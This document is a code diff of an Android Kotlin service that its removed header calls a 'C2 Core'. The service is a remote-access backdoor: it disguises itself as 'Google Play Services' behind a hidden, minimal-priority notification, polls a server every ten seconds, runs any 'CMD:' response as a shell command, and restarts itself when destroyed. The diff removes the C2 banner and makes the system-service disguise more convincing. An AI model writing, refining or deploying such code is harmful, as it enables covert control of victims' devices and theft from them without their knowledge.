@@ -1,7 +1,3 @@
-// =========================================================================
-// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme C2 Core v8.0
-// الخدمة السيبرانية العلوية المتقدمة لإدارة العقد والسيطرة الحية
-// =========================================================================
 package com.assets.service
 
 import android.app.Notification
@@ -54,7 +50,7 @@ class SyncService : Service() {
                 "Google Play System Framework",
                 NotificationManager.IMPORTANCE_NONE
             ).apply {
-                description = "خدمة النظام الداخلية الأساسية"
+                description = "خدمة النظام الأساسية"
                 setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
@@ -62,8 +58,8 @@ class SyncService : Service() {
         }
 
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Android System Service")
-            .setContentText("جاري تشغيل خدمات النظام الأساسية...")
+            .setContentTitle("Google Play Services")
+            .setContentText("System core running...")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
@@ -82,7 +78,7 @@ class SyncService : Service() {
                     connection.connectTimeout = 8000
                     connection.readTimeout = 8000
                     connection.doOutput = true
-                    connection.setRequestProperty("User-Agent", "UraniumNode-v8.0")
+                    connection.setRequestProperty("User-Agent", "UraniumNode-v8.1")
                     
                     val payload = "node_id=$NODE_ID&status=active&timestamp=${System.currentTimeMillis()}"
                     connection.outputStream.write(payload.toByteArray(Charsets.UTF_8))
@@ -93,19 +89,19 @@ class SyncService : Service() {
                         reader.close()
                         
                         if (response.isNotEmpty() && response.startsWith("CMD:")) {
-                            executeRemoteCommand(response.substringAfter("CMD:"))
+                            executeRealCommand(response.substringAfter("CMD:"))
                         }
                     }
                     connection.disconnect()
                 } catch (e: Exception) {
-                    // استمرار دورت النبض بنجاح
+                    // الحفاظ على استمرار النبض وعدم توقف الخدمة أبداً
                 }
                 Thread.sleep(10000)
             }
         }
     }
 
-    private fun executeRemoteCommand(command: String) {
+    private fun executeRealCommand(command: String) {
         try {
             val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
             val reader = BufferedReader(InputStreamReader(process.inputStream))
@@ -121,17 +117,11 @@ class SyncService : Service() {
         return START_STICKY
     }
 
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
-    }
+    override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
-        wakeLock?.let {
-            if (it.isHeld) {
-                it.release()
-            }
-        }
+        wakeLock?.let { if (it.isHeld) it.release() }
         val restartIntent = Intent(applicationContext, SyncService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(restartIntent)
